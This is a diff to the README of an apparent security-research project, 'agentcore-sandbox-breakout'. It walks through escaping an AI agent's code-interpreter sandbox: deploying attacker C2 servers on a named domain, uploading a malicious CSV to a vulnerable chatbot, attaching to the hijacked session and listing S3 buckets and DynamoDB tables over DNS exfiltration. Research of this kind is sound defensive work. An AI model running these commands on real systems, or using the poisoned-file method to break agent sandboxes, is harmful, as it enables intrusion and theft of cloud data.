@@ -87,7 +87,6 @@ agentcore-sandbox-breakout/
 │   ├── chatbot/             # Vulnerable FastAPI application
 │   └── Makefile
 │
-├── shared/                  # Shared code (DNS protocol)
 ├── docs/                    # Technical specifications
 └── Makefile                 # Root Makefile for orchestration
 ```
@@ -115,32 +114,30 @@ source set_env_vars.sh
 cd victim-infra
 make deploy
 
-# Terminal 1: Launch attack
+# Terminal 1: Launch attack (note the session ID in output)
 make attack TARGET=$(cd ../victim-infra/terraform && terraform output -raw chatbot_url)
 
-# Terminal 1: Interact with compromised session
-make operator
+# Terminal 1: Attach to compromised session (use session ID from attack output)
+make attach SESSION=sess_abc123
 # In operator shell:
-# > send whoami
-# > send aws s3 ls
-# > send aws dynamodb list-tables
+# > whoami
+# > aws s3 ls
+# > aws dynamodb list-tables
 ```
 
 ---
 
-## Original Quick Start Guide (Direct Code Interpreter Access)
-
-This method requires direct access to a Code Interpreter (i.e., AWS credentials).
+## Attacker Infrastructure Setup
 
 ### Prerequisites
 
 - AWS CLI configured
 - Python 3.12
-- Terraform installed with the latest provider ()
+- Terraform installed with the latest provider
 
-### Step 1: Deploy Infrastructure
+### Step 1: Deploy C2 Infrastructure
 
-First, you will need to edit the `attacker-infra/terraform/terraform.tfvars` file to set your domain name and AWS region. Set the following environment variables with your own domain and append them to `attacker-infra/terraform/terraform.tfvars`:
+First, edit the `attacker-infra/terraform/terraform.tfvars` file to set your domain name and AWS region:
 
 ```bash
 export DOMAIN_NAME="bt-research-control.com"
@@ -149,31 +146,41 @@ export BUCKET_NAME="agentcore-hacking"
 cat << EOF >> attacker-infra/terraform/terraform.tfvars
 domain_name = "${DOMAIN_NAME}"
 aws_region = "${REGION}"
-# This creates two buckets - one with the name, and one suffixed with -sensitive-data
 s3_bucket_name = "${BUCKET_NAME}"
 EOF
 ```
 
-Run the following commands to deploy the infrastructure and configure the EC2 instance.
+Deploy the C2 server infrastructure:
 
 ```bash
 cd attacker-infra
 
-# 1. Deploy infrastructure
+# Deploy infrastructure
 make terraform-yolo
 source set_env_vars.sh
-make configure-ec2
 ```
 
-### Step 2: Start the Interactive Shell
+### Step 2: Generate and Send Malicious Payload
 
-To run the interactive shell, you can use the following commands:
+Generate a malicious CSV with embedded payload:
 
 ```bash
-make operator
+make generate-csv
 ```
 
-### Step 3: Verify DNS Exfiltration
+Then either:
+- **Automated**: `make attack TARGET=https://victim-chatbot.com`
+- **Manual**: Upload the generated CSV to the victim chatbot web UI
+
+### Step 3: Attach to Session
+
+Use the session ID from the payload generation step:
+
+```bash
+make attach SESSION=sess_abc123
+```
+
+### Step 4: Verify DNS Exfiltration
 
 Now that you are in the interactive shell, you can verify that DNS exfiltration is working by executing these example commands.
 
